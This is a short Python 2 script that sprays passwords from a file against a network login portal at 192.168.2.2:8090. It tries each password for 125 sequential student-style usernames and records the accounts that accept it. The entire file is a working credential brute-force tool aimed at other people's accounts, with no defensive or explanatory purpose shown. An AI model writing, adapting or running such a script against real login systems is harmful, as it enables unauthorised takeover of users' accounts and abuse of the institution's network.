#!/usr/bin/python
import urllib
import os
import sys
usn = 1
i = 0
passwd='abcd'
fp = open("user1","w")
fp2 = open("pass","r")
#fp3 = open("usnlist","r")
check = True
while check :
  pr1 = fp2.readline()
  if pr1 == '':
    check = False
    print 'End of File'
    sys.exit()
  passwd = pr1[:-1]
  print passwd
  while usn <= 125 :
     if usn <= 9:
       get = urllib.urlopen("http://192.168.2.2:8090/login.xml","mode=191&username="+"2sd11me00"+str(usn)+"&password="+passwd+"&a=1355344698415")
     elif usn >= 10 and usn <= 99 :
       get = urllib.urlopen("http://192.168.2.2:8090/login.xml","mode=191&username="+"2sd11me0"+str(usn)+"&password="+passwd+"&a=1355344698415")
     else :
       get = urllib.urlopen("http://192.168.2.2:8090/login.xml","mode=191&username="+"2sd11me"+str(usn)+"&password="+passwd+"&a=1355344698415")
     p = get.readlines(5)
     str1 = p[0]
     ret_value = str1.find("in")
     if ret_value != -1:
       print usn
       fp.write(str(usn))
       fp.write("\n")
       #print usn
     usn = usn  + 1
  os.system("sleep 2")
  usn = 1
fp2.close()
